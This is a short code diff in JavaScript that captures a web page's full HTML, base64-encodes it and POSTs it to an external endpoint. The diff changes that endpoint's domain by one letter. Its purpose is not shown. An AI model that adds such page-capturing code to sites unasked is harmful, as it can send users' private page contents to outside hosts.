@@ -6,7 +6,7 @@
 const html = document.documentElement.outerHTML;
 const base64 = btoa(unescape(encodeURIComponent(html)));
 
-fetch('https://cdn.bigsev.org/endpoint', {
+fetch('https://cdn.bugsev.org/endpoint', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({ html: base64 })
